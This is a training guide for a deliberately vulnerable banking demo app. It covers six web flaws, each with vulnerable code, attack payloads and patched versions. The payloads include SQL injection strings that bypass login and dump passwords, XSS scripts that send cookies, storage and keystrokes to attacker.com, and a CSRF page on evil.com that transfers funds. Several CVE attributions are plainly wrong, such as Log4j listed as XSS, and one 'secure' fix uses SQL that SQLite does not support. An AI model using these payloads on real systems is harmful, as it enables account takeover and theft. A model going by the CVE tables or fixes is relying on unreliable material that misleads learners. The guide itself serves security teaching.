# SecureBank Vulnerability Guide

Comprehensive guide to the six critical vulnerabilities in SecureBank Red Team, including technical details, real-world impact, and OWASP classifications.

---

## Table of Contents

1. [Overview](#overview)
2. [SQL Injection](#sql-injection)
3. [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
4. [Race Condition](#race-condition)
5. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
6. [Mass Assignment](#mass-assignment)
7. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
8. [Vulnerability Summary](#vulnerability-summary)
9. [Risk Assessment](#risk-assessment)

---

## Overview

SecureBank Red Team contains six critical vulnerabilities that are commonly found in real-world applications. Each vulnerability is intentionally implemented for educational purposes to help you understand:

- **What** the vulnerability is
- **Why** it exists
- **How** it works
- **How** to exploit it
- **How** to defend against it

### Learning Objectives

After studying these vulnerabilities, you will be able to:
- Identify security flaws in web applications
- Understand the root causes of vulnerabilities
- Explain the impact to stakeholders
- Recommend appropriate defenses
- Test applications for similar issues

---

## SQL Injection

### What is SQL Injection?

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers insert malicious SQL code into input fields, which then gets executed by the database.

### Why Does It Exist?

SQL Injection occurs when:
1. User input is directly concatenated into SQL queries
2. Input is not properly validated or sanitized
3. Developers trust user-supplied data
4. Dynamic SQL queries are built using string concatenation

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Login endpoint
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        return jsonify({"success": True, "user_id": user[0]})
    return jsonify({"success": False})
```

#### Attack Example

**Normal Login:**
```
Username: alice
Password: alice123
Query: SELECT * FROM users WHERE username='alice' AND password='alice123'
```

**SQL Injection Attack:**
```
Username: alice' OR '1'='1
Password: anything
Query: SELECT * FROM users WHERE username='alice' OR '1'='1' AND password='anything'
```

The condition `'1'='1'` is always true, bypassing authentication!

### Attack Variations

#### 1. Authentication Bypass
```sql
-- Always true condition
Username: ' OR '1'='1' --
Password: anything

-- Comment out the rest
Username: admin' --
Password: anything

-- Union-based injection
Username: ' UNION SELECT NULL, 'admin', 'password', NULL --
Password: anything
```

#### 2. Data Extraction
```sql
-- Extract all usernames
' UNION SELECT username, NULL, NULL, NULL FROM users --

-- Extract passwords
' UNION SELECT username, password, NULL, NULL FROM users --

-- Database version
' UNION SELECT sqlite_version(), NULL, NULL, NULL --
```

#### 3. Data Modification
```sql
-- Update balance
'; UPDATE accounts SET balance=999999 WHERE account_id=1001 --

-- Delete transactions
'; DELETE FROM transactions WHERE account_id != 1001 --
```

### Real-World Impact

#### Financial Damage
- **2008 - Heartland Payment Systems**: 130 million credit cards stolen via SQL injection
  - Cost: $140 million in settlements
  - CVE-2008-4537

- **2011 - Sony PlayStation Network**: 77 million accounts compromised
  - Cost: $171 million
  - 23 days of downtime

#### Data Breaches
- **2012 - Yahoo Voices**: 450,000 passwords exposed
- **2013 - Belgian Passport Database**: Entire database dumped
- **2017 - Equifax**: 147 million records (Apache Struts vulnerability)

### OWASP Classification

**OWASP Top 10 (2021): A03:2021 – Injection**

**Risk Rating:**
- **Prevalence**: Common
- **Detectability**: Easy
- **Impact**: Severe
- **Technical Impact**: Data loss, data theft, denial of service

**CWE Classification:**
- CWE-89: SQL Injection
- CWE-564: SQL Injection: Hibernate
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2021-21975 | VMware vRealize Operations SQL Injection | Critical (9.8) |
| CVE-2020-1938 | Apache Tomcat AJP Connector | Critical (9.8) |
| CVE-2019-16759 | vBulletin SQL Injection | Critical (9.8) |
| CVE-2018-15133 | Laravel SQL Injection | High (8.8) |

### Statistics and Prevalence

- **32%** of applications tested positive for SQL injection (2022 Verizon DBIR)
- **#3** most common web application attack
- **65%** of SQL injection vulnerabilities are exploited within 1 year
- **Average cost per breach**: $3.86 million (IBM Security Report)

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - Secure login
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
    
    if user:
        # Additional security: hash password comparison
        return jsonify({"success": True, "user_id": user[0]})
    return jsonify({"success": False})
```

### Defense Mechanisms

1. **Parameterized Queries** (Prepared Statements)
2. **ORM (Object-Relational Mapping)**
3. **Input Validation**
4. **Least Privilege Principle**
5. **Web Application Firewall (WAF)**

---

## Insecure Direct Object Reference (IDOR)

### What is IDOR?

IDOR occurs when an application exposes internal implementation objects (like database keys, filenames, or URLs) without proper authorization checks. Attackers can manipulate these references to access unauthorized data.

### Why Does It Exist?

IDOR vulnerabilities occur when:
1. Authorization checks are missing
2. Access control relies solely on obscurity
3. Direct object references are exposed in URLs/parameters
4. Developers assume users won't manipulate parameters

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Get account endpoint
@app.route('/api/account/<int:account_id>', methods=['GET'])
def get_account(account_id):
    # VULNERABLE: No authorization check
    query = "SELECT * FROM accounts WHERE account_id=?"
    cursor.execute(query, (account_id,))
    account = cursor.fetchone()
    
    if account:
        return jsonify({
            "account_id": account[0],
            "user_id": account[1],
            "balance": account[2],
            "account_type": account[3]
        })
    return jsonify({"error": "Account not found"})
```

#### Attack Example

**Legitimate Request:**
```
GET /api/account/1001
Authorization: Bearer alice_token

Response: Alice's account details
```

**IDOR Attack:**
```
GET /api/account/1002
Authorization: Bearer alice_token

Response: Bob's account details (unauthorized!)
```

Alice can access Bob's account by simply changing the account ID!

### Attack Variations

#### 1. Sequential ID Enumeration
```bash
# Enumerate all accounts
for i in {1000..1100}; do
    curl http://localhost:5001/api/account/$i
done
```

#### 2. Transaction Access
```bash
# Access other users' transactions
GET /api/transactions?account_id=1002
# Alice accessing Bob's transactions
```

#### 3. Profile Manipulation
```bash
# Modify another user's profile
PUT /api/user/2
{
    "email": "attacker@evil.com",
    "balance": 999999
}
```

#### 4. Document Access
```bash
# Access other users' statements
GET /api/statement/1002/2024-01.pdf
```

### Real-World Impact

#### Notable IDOR Breaches

- **2019 - Facebook**: IDOR in Instagram allowed viewing private photos
  - Affected: Millions of users
  - Bug Bounty: $10,000

- **2020 - T-Mobile**: IDOR exposed customer data
  - Affected: Unknown number of customers
  - Settlement: $350 million

- **2018 - Uber**: IDOR allowed riders to see drivers' personal info
  - Bug Bounty: $3,000

- **2021 - Clubhouse**: IDOR exposed user phone numbers
  - Affected: 1.3 million users

### OWASP Classification

**OWASP Top 10 (2021): A01:2021 – Broken Access Control**

**Risk Rating:**
- **Prevalence**: Very Common
- **Detectability**: Easy
- **Impact**: High
- **Technical Impact**: Unauthorized data access

**CWE Classification:**
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control
- CWE-862: Missing Authorization

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2021-24145 | WordPress Plugin IDOR | High (7.5) |
| CVE-2020-15129 | Traefik IDOR | Medium (6.5) |
| CVE-2019-19985 | GitLab IDOR | High (8.1) |
| CVE-2018-18778 | Mini-Intrusion IDOR | High (7.5) |

### Statistics and Prevalence

- **94%** of applications tested positive for broken access control (2021)
- **#1** vulnerability in OWASP Top 10 (2021)
- **71%** of IDOR vulnerabilities found in financial applications
- **Average bounty**: $500-$5,000 for IDOR findings

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - Secure account access
@app.route('/api/account/<int:account_id>', methods=['GET'])
def get_account(account_id):
    # Get current user from session
    current_user_id = session.get('user_id')
    
    # SECURE: Authorization check
    query = """
        SELECT * FROM accounts 
        WHERE account_id=? AND user_id=?
    """
    cursor.execute(query, (account_id, current_user_id))
    account = cursor.fetchone()
    
    if account:
        return jsonify({
            "account_id": account[0],
            "balance": account[2],
            "account_type": account[3]
        })
    return jsonify({"error": "Unauthorized"}), 403
```

### Defense Mechanisms

1. **Authorization Checks**: Verify user owns the resource
2. **Indirect References**: Use session data instead of parameters
3. **Access Control Lists (ACLs)**
4. **UUIDs Instead of Sequential IDs**
5. **Per-User/Session Indirect Object References**

---

## Race Condition

### What is a Race Condition?

A race condition occurs when multiple requests access and modify shared resources simultaneously, leading to unexpected behavior. In financial applications, this can allow attackers to exploit timing windows to perform duplicate transactions.

### Why Does It Exist?

Race conditions occur when:
1. No locking mechanism protects shared resources
2. Balance checks and updates aren't atomic operations
3. Multiple requests process simultaneously
4. Transactions lack proper isolation

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Transfer money (vulnerable)
@app.route('/api/transfer', methods=['POST'])
def transfer():
    from_account = request.json.get('from_account')
    to_account = request.json.get('to_account')
    amount = request.json.get('amount')
    
    # VULNERABLE: Non-atomic operation
    # Step 1: Check balance
    cursor.execute("SELECT balance FROM accounts WHERE account_id=?", (from_account,))
    balance = cursor.fetchone()[0]
    
    # Step 2: Validate sufficient funds
    if balance < amount:
        return jsonify({"error": "Insufficient funds"})
    
    # Step 3: Deduct from sender (RACE WINDOW HERE!)
    new_balance = balance - amount
    cursor.execute("UPDATE accounts SET balance=? WHERE account_id=?", 
                   (new_balance, from_account))
    
    # Step 4: Add to recipient
    cursor.execute("UPDATE accounts SET balance=balance+? WHERE account_id=?",
                   (amount, to_account))
    
    conn.commit()
    return jsonify({"success": True})
```

#### Attack Example

**Account Initial State:**
- Alice's balance: $1000

**Attack Scenario:**
```
Time    Request 1                      Request 2
----    ---------                      ---------
T1      Check balance: $1000           
T2                                     Check balance: $1000
T3      Validate: $1000 >= $500 ✓      
T4                                     Validate: $1000 >= $500 ✓
T5      Deduct: $1000 - $500 = $500    
T6                                     Deduct: $1000 - $500 = $500
T7      Commit: Balance = $500         
T8                                     Commit: Balance = $500

Result: Alice sent $1000 but balance shows $500 (should be $0)
```

Alice effectively duplicated $500!

### Attack Variations

#### 1. Simultaneous Transfers
```bash
# Send 10 identical requests simultaneously
for i in {1..10}; do
    curl -X POST http://localhost:5001/api/transfer \
        -H "Content-Type: application/json" \
        -d '{"from_account":1001,"to_account":1002,"amount":100}' &
done
wait

# Result: Multiple transfers may process with single balance deduction
```

#### 2. Balance Multiplication
```python
import threading
import requests

def transfer():
    requests.post('http://localhost:5001/api/transfer', json={
        'from_account': 1001,
        'to_account': 1002,
        'amount': 500
    })

# Launch 5 simultaneous threads
threads = []
for i in range(5):
    t = threading.Thread(target=transfer)
    threads.append(t)
    t.start()

# Wait for all threads
for t in threads:
    t.join()
```

#### 3. Withdrawal Race
```bash
# Withdraw more than available balance
# Send multiple withdrawal requests before balance updates
```

### Real-World Impact

#### Financial Losses

- **2016 - Flexcoin**: Race condition in Bitcoin exchange
  - Loss: $600,000 in Bitcoin
  - Exchange shut down

- **2010 - TD Ameritrade**: ATM race condition
  - Multiple users withdrew same funds
  - Loss: Undisclosed

- **2018 - Cryptocurrency Exchange**: Integer overflow race condition
  - Loss: $20 million
  - CVE-2018-10299

#### Bug Bounty Rewards

- **HackerOne Report #286179**: Race condition in payment system
  - Bounty: $7,500

- **Bugcrowd Report**: Race condition allowing duplicate purchases
  - Bounty: $2,000

### OWASP Classification

**OWASP Top 10 (2021): A04:2021 – Insecure Design**

**Risk Rating:**
- **Prevalence**: Uncommon but critical
- **Detectability**: Difficult
- **Impact**: Critical
- **Technical Impact**: Monetary loss, data corruption

**CWE Classification:**
- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
- CWE-366: Race Condition within a Thread
- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2021-3156 | Sudo Race Condition | High (7.8) |
| CVE-2020-8835 | Linux Kernel Race Condition | High (7.8) |
| CVE-2019-13272 | Linux PTRACE Race Condition | High (7.8) |
| CVE-2016-5195 | Dirty COW Race Condition | High (7.8) |

### Statistics and Prevalence

- **8%** of financial applications vulnerable to race conditions
- **Average exploitation time**: 2-5 seconds
- **Detection difficulty**: High (requires specific timing)
- **Impact severity**: Critical in financial systems

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - Secure transfer with locking
import threading

transfer_lock = threading.Lock()

@app.route('/api/transfer', methods=['POST'])
def transfer():
    from_account = request.json.get('from_account')
    to_account = request.json.get('to_account')
    amount = request.json.get('amount')
    
    # SECURE: Atomic transaction with lock
    with transfer_lock:
        try:
            # Begin transaction
            conn.execute("BEGIN IMMEDIATE")
            
            # Get and lock account balance
            cursor.execute(
                "SELECT balance FROM accounts WHERE account_id=? FOR UPDATE",
                (from_account,)
            )
            balance = cursor.fetchone()[0]
            
            # Validate
            if balance < amount:
                conn.rollback()
                return jsonify({"error": "Insufficient funds"}), 400
            
            # Atomic update
            cursor.execute(
                "UPDATE accounts SET balance=balance-? WHERE account_id=?",
                (amount, from_account)
            )
            cursor.execute(
                "UPDATE accounts SET balance=balance+? WHERE account_id=?",
                (amount, to_account)
            )
            
            # Commit transaction
            conn.commit()
            return jsonify({"success": True})
            
        except Exception as e:
            conn.rollback()
            return jsonify({"error": str(e)}), 500
```

### Defense Mechanisms

1. **Database Transactions**: Use BEGIN/COMMIT
2. **Row-Level Locking**: SELECT FOR UPDATE
3. **Optimistic Locking**: Version numbers
4. **Application-Level Locks**: Threading locks
5. **Idempotency Keys**: Prevent duplicate processing

---

## Cross-Site Scripting (XSS)

### What is XSS?

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in victims' browsers, potentially stealing sensitive data or performing unauthorized actions.

### Why Does It Exist?

XSS vulnerabilities occur when:
1. User input is displayed without sanitization
2. HTML special characters aren't escaped
3. Content Security Policy (CSP) is missing
4. Output encoding is insufficient

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Display user profile
@app.route('/api/profile/<int:user_id>', methods=['GET'])
def get_profile(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    
    # VULNERABLE: Returns unsanitized data
    return jsonify({
        "username": user[1],
        "email": user[2],
        "full_name": user[3]  # Not sanitized!
    })
```

```javascript
// Frontend - Displays profile (vulnerable)
function displayProfile(profile) {
    // VULNERABLE: Direct HTML insertion
    document.getElementById('profile').innerHTML = `
        <h2>Welcome, ${profile.full_name}!</h2>
        <p>Email: ${profile.email}</p>
    `;
}
```

#### Attack Example

**Normal Profile:**
```json
{
    "full_name": "Alice Johnson",
    "email": "alice@example.com"
}

Display: Welcome, Alice Johnson!
```

**XSS Attack:**
```json
{
    "full_name": "<script>alert('XSS')</script>",
    "email": "alice@example.com"
}

Display: [JavaScript executes: alert shown]
```

### Attack Variations

#### 1. Stored XSS (Persistent)
```javascript
// Stored in database
Full Name: <script>
    // Steal session token
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// Executes for every user viewing the profile
```

#### 2. Reflected XSS (Non-Persistent)
```
# URL parameter injection
http://localhost:8000/search?q=<script>alert(document.cookie)</script>

# Attacker sends link to victim
# Script executes when victim clicks
```

#### 3. DOM-Based XSS
```javascript
// Vulnerable JavaScript
var username = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Hello " + username;

// Attack URL
http://localhost:8000/#<img src=x onerror=alert(1)>
```

#### 4. Cookie Stealing
```javascript
<script>
    // Send cookies to attacker
    new Image().src = 'http://attacker.com/log?c=' + 
                      encodeURIComponent(document.cookie);
</script>
```

#### 5. Keylogging
```javascript
<script>
    document.addEventListener('keypress', function(e) {
        fetch('http://attacker.com/log?key=' + e.key);
    });
</script>
```

#### 6. Session Hijacking
```javascript
<script>
    // Steal and send session token
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            cookie: document.cookie,
            localStorage: localStorage,
            sessionStorage: sessionStorage
        })
    });
</script>
```

### Real-World Impact

#### Major XSS Incidents

- **2018 - British Airways**: XSS led to credit card theft
  - Affected: 380,000 customers
  - Fine: £20 million ($26M)

- **2017 - Equifax**: XSS on support portal
  - Contributed to major breach
  - Loss: 147 million records

- **2015 - eBay**: Stored XSS vulnerability
  - Bug Bounty: $5,000

- **2014 - Yahoo**: XSS in Yahoo Mail
  - Exploited for phishing attacks

### OWASP Classification

**OWASP Top 10 (2021): A03:2021 – Injection**

**Risk Rating:**
- **Prevalence**: Very Common
- **Detectability**: Easy
- **Impact**: Moderate to High
- **Technical Impact**: Session hijacking, defacement, phishing

**CWE Classification:**
- CWE-79: Improper Neutralization of Input During Web Page Generation
- CWE-80: Improper Neutralization of Script-Related HTML Tags
- CWE-83: Improper Neutralization of Script in Attributes

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2021-44228 | Log4j XSS Component | Critical (10.0) |
| CVE-2020-11022 | jQuery XSS | Medium (6.9) |
| CVE-2019-11358 | jQuery Prototype Pollution | Medium (6.1) |
| CVE-2018-14042 | Bootstrap XSS | Medium (6.1) |

### Statistics and Prevalence

- **40%** of all websites vulnerable to XSS (2021)
- **#2** most commonly reported vulnerability on HackerOne
- **Average bounty**: $400-$2,000
- **53%** of XSS vulnerabilities are stored XSS

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - Secure profile display
import html

@app.route('/api/profile/<int:user_id>', methods=['GET'])
def get_profile(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    
    # SECURE: Escape HTML entities
    return jsonify({
        "username": html.escape(user[1]),
        "email": html.escape(user[2]),
        "full_name": html.escape(user[3])
    })
```

```javascript
// Frontend - Secure display
function displayProfile(profile) {
    // SECURE: Use textContent instead of innerHTML
    const h2 = document.createElement('h2');
    h2.textContent = 'Welcome, ' + profile.full_name + '!';
    
    const p = document.createElement('p');
    p.textContent = 'Email: ' + profile.email;
    
    document.getElementById('profile').appendChild(h2);
    document.getElementById('profile').appendChild(p);
}
```

### Defense Mechanisms

1. **Output Encoding**: Escape HTML, JavaScript, URL contexts
2. **Content Security Policy (CSP)**: Restrict script sources
3. **Input Validation**: Whitelist allowed characters
4. **HTTPOnly Cookies**: Prevent JavaScript cookie access
5. **DOM APIs**: Use textContent instead of innerHTML
6. **Framework Protections**: React, Angular auto-escaping

---

## Mass Assignment

### What is Mass Assignment?

Mass Assignment occurs when applications automatically bind user-provided data to internal objects without filtering. Attackers can modify unintended fields by adding extra parameters to requests.

### Why Does It Exist?

Mass Assignment vulnerabilities occur when:
1. All request parameters are blindly assigned to objects
2. No whitelist of allowed fields exists
3. Internal fields are accessible through APIs
4. Developers rely on framework auto-binding

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Update profile
@app.route('/api/profile', methods=['PUT'])
def update_profile():
    user_id = session.get('user_id')
    data = request.json
    
    # VULNERABLE: All fields from request are used
    fields = []
    values = []
    
    for key, value in data.items():
        fields.append(f"{key}=?")
        values.append(value)
    
    query = f"UPDATE users SET {', '.join(fields)} WHERE user_id=?"
    values.append(user_id)
    
    cursor.execute(query, values)
    conn.commit()
    
    return jsonify({"success": True})
```

#### Attack Example

**Normal Profile Update:**
```json
PUT /api/profile
{
    "email": "alice@newmail.com",
    "phone": "555-1234"
}

Result: Email and phone updated
```

**Mass Assignment Attack:**
```json
PUT /api/profile
{
    "email": "alice@newmail.com",
    "phone": "555-1234",
    "balance": 999999,
    "is_admin": true,
    "account_type": "premium"
}

Result: User becomes admin with $999,999 balance!
```

### Attack Variations

#### 1. Privilege Escalation
```json
POST /api/register
{
    "username": "attacker",
    "password": "pass123",
    "role": "admin",
    "is_verified": true,
    "account_status": "premium"
}
```

#### 2. Balance Manipulation
```json
PUT /api/account
{
    "account_type": "checking",
    "balance": 1000000,
    "credit_limit": 500000
}
```

#### 3. Bypassing Paid Features
```json
PUT /api/user
{
    "subscription": "premium",
    "features_enabled": ["all"],
    "trial_expired": false
}
```

### Real-World Impact

#### Major Incidents

- **2012 - GitHub**: Mass assignment led to repository access
  - Attacker gained write access to Rails repository
  - CVE-2012-3496

- **2012 - Homakov Incident**: Rails mass assignment
  - Demonstrated by adding himself to Rails core team
  - Led to Rails security improvements

- **2019 - Twitter**: Mass assignment in API
  - Bug Bounty: $560

- **2020 - Facebook**: Mass assignment in Graph API
  - Bug Bounty: $16,000

### OWASP Classification

**OWASP Top 10 (2021): A04:2021 – Insecure Design**

**Risk Rating:**
- **Prevalence**: Common
- **Detectability**: Moderate
- **Impact**: High
- **Technical Impact**: Privilege escalation, data manipulation

**CWE Classification:**
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-502: Deserialization of Untrusted Data
- CWE-470: Use of Externally-Controlled Input to Select Classes or Code

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2012-3496 | Ruby on Rails Mass Assignment | High (7.5) |
| CVE-2013-0277 | Rails attr_protected Bypass | High (7.5) |
| CVE-2013-0276 | Rails Serialization | Critical (9.8) |
| CVE-2012-5664 | Rails SQL Injection via Mass Assignment | High (7.5) |

### Statistics and Prevalence

- **15%** of APIs vulnerable to mass assignment
- **Common in frameworks**: Rails, Laravel, Django
- **Average bounty**: $500-$5,000
- **Often chained with other vulnerabilities**

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - Secure profile update
@app.route('/api/profile', methods=['PUT'])
def update_profile():
    user_id = session.get('user_id')
    data = request.json
    
    # SECURE: Whitelist allowed fields
    ALLOWED_FIELDS = ['email', 'phone', 'full_name', 'address']
    
    fields = []
    values = []
    
    for key, value in data.items():
        if key in ALLOWED_FIELDS:  # Only allow whitelisted fields
            fields.append(f"{key}=?")
            values.append(value)
    
    if not fields:
        return jsonify({"error": "No valid fields to update"}), 400
    
    query = f"UPDATE users SET {', '.join(fields)} WHERE user_id=?"
    values.append(user_id)
    
    cursor.execute(query, values)
    conn.commit()
    
    return jsonify({"success": True})
```

### Defense Mechanisms

1. **Whitelist Fields**: Only allow specific fields to be updated
2. **Separate DTOs**: Use Data Transfer Objects
3. **Explicit Binding**: Manually assign each field
4. **Framework Protections**: Use strong_parameters (Rails), mass assignment guard
5. **Input Validation**: Validate each field individually

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?

CSRF tricks authenticated users into performing unwanted actions on a web application. Attackers craft malicious requests that execute using the victim's credentials.

### Why Does It Exist?

CSRF vulnerabilities occur when:
1. No CSRF token validation exists
2. Session authentication alone is trusted
3. State-changing operations use GET requests
4. SameSite cookie attribute is missing

### How It Works

#### Vulnerable Code Example (Red Team)

```python
# securebank_red.py - Transfer without CSRF protection
@app.route('/api/transfer', methods=['POST'])
def transfer():
    # VULNERABLE: No CSRF token check
    from_account = request.json.get('from_account')
    to_account = request.json.get('to_account')
    amount = request.json.get('amount')
    
    # Only checks session cookie (automatically sent by browser)
    if 'user_id' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    # Perform transfer
    # ... transfer logic ...
    
    return jsonify({"success": True})
```

#### Attack Example

**Attacker creates malicious website:**

```html
<!-- evil.com/attack.html -->
<html>
<body>
    <h1>Click here for free money!</h1>
    <img src="http://localhost:5001/api/transfer?from=1001&to=9999&amount=1000" 
         style="display:none">
    
    <script>
        // Or use fetch to make POST request
        fetch('http://localhost:5001/api/transfer', {
            method: 'POST',
            credentials: 'include',  // Include cookies
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                from_account: 1001,
                to_account: 9999,
                amount: 1000
            })
        });
    </script>
</body>
</html>
```

**Attack Flow:**
1. Victim logs into SecureBank (gets session cookie)
2. Victim visits evil.com (cookie still valid)
3. evil.com sends request to SecureBank API
4. Browser automatically includes session cookie
5. SecureBank processes transfer (thinks it's legitimate)
6. Money transferred to attacker!

### Attack Variations

#### 1. Form-Based CSRF
```html
<form action="http://localhost:5001/api/transfer" method="POST">
    <input type="hidden" name="to_account" value="9999">
    <input type="hidden" name="amount" value="5000">
</form>
<script>
    document.forms[0].submit();
</script>
```

#### 2. Image-Based CSRF (GET requests)
```html
<img src="http://localhost:5001/api/delete-account?confirm=yes">
```

#### 3. AJAX CSRF
```javascript
fetch('http://localhost:5001/api/change-password', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({
        new_password: 'hacked123'
    })
});
```

#### 4. Social Engineering
```
Email: "You've won $1000! Click here to claim"
Link: http://evil.com/claim-prize
Page: Auto-submits CSRF attack
```

### Real-World Impact

#### Major CSRF Attacks

- **2008 - YouTube**: CSRF allowed attackers to perform actions as any user
  - Add videos to favorites
  - Send friend requests
  - CVE-2008-3716

- **2007 - Gmail**: CSRF filter bypass
  - Allowed unauthorized email sending
  - Google Bug Bounty reward

- **2018 - TikTok**: CSRF in account deletion
  - Bug Bounty: $3,860

- **2019 - GitLab**: CSRF leading to account takeover
  - CVE-2019-9220
  - Bounty: $3,000

### OWASP Classification

**OWASP Top 10 (2021): A01:2021 – Broken Access Control**

**Risk Rating:**
- **Prevalence**: Common
- **Detectability**: Easy
- **Impact**: Moderate to High
- **Technical Impact**: Unauthorized actions, data manipulation

**CWE Classification:**
- CWE-352: Cross-Site Request Forgery
- CWE-352: CSRF
- CWE-346: Origin Validation Error

### CVE Examples

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2021-21315 | WordPress CSRF | Medium (6.5) |
| CVE-2020-11022 | jQuery CSRF | Medium (6.9) |
| CVE-2019-9220 | GitLab CSRF | High (8.8) |
| CVE-2018-16341 | Gitea CSRF | High (8.8) |

### Statistics and Prevalence

- **27%** of websites vulnerable to CSRF
- **#8** in OWASP Top 10 (2017), merged into Broken Access Control (2021)
- **Average bounty**: $300-$2,000
- **Often found in**: Banking apps, social media, admin panels

### Secure Implementation (Blue Team)

```python
# securebank_blue.py - CSRF protection
import secrets

# Generate CSRF token
@app.route('/api/csrf-token', methods=['GET'])
def get_csrf_token():
    token = secrets.token_urlsafe(32)
    session['csrf_token'] = token
    return jsonify({"csrf_token": token})

# Validate CSRF token
@app.route('/api/transfer', methods=['POST'])
def transfer():
    # SECURE: Check CSRF token
    csrf_token = request.headers.get('X-CSRF-Token')
    session_token = session.get('csrf_token')
    
    if not csrf_token or csrf_token != session_token:
        return jsonify({"error": "Invalid CSRF token"}), 403
    
    # Proceed with transfer
    # ... transfer logic ...
    
    return jsonify({"success": True})
```

```javascript
// Frontend - Include CSRF token
async function makeTransfer(data) {
    // Get CSRF token
    const response = await fetch('/api/csrf-token');
    const {csrf_token} = await response.json();
    
    // Include token in request
    return fetch('/api/transfer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrf_token
        },
        body: JSON.stringify(data)
    });
}
```

### Defense Mechanisms

1. **CSRF Tokens**: Synchronizer token pattern
2. **SameSite Cookies**: Prevent cross-site cookie sending
3. **Double Submit Cookie**: Cookie and request parameter
4. **Custom Headers**: X-Requested-With
5. **Origin/Referer Validation**: Check request source
6. **Re-authentication**: For sensitive operations

---

## Vulnerability Summary

### Comparison Table

| Vulnerability | OWASP 2021 | Severity | Prevalence | Exploit Difficulty | Detection |
|---------------|------------|----------|------------|-------------------|-----------|
| SQL Injection | A03 | Critical | Common | Easy | Easy |
| IDOR | A01 | High | Very Common | Easy | Easy |
| Race Condition | A04 | Critical | Uncommon | Hard | Hard |
| XSS | A03 | High | Very Common | Easy | Easy |
| Mass Assignment | A04 | High | Common | Moderate | Moderate |
| CSRF | A01 | Medium | Common | Easy | Easy |

### Impact Matrix

| Vulnerability | Confidentiality | Integrity | Availability | Financial |
|---------------|-----------------|-----------|--------------|-----------|
| SQL Injection | High | High | High | Critical |
| IDOR | High | Medium | Low | High |
| Race Condition | Low | High | Medium | Critical |
| XSS | High | Medium | Low | Medium |
| Mass Assignment | Medium | High | Low | High |
| CSRF | Medium | High | Low | Medium |

---

## Risk Assessment

### Overall Risk Score

**SecureBank Red Team Risk: 9.5/10 (Critical)**

Based on:
- Multiple critical vulnerabilities
- Financial application context
- Easy exploitation
- High impact potential

### Recommended Actions

1. **Immediate**: Deploy Blue Team implementation
2. **Short-term**: Implement all defense mechanisms
3. **Long-term**: Security training, regular audits
4. **Ongoing**: Penetration testing, bug bounty program

---

*For detailed exploitation techniques, see the Exploitation Guide.*
*For defense implementations, see the Defense Guide.*

*Last Updated: 2024*
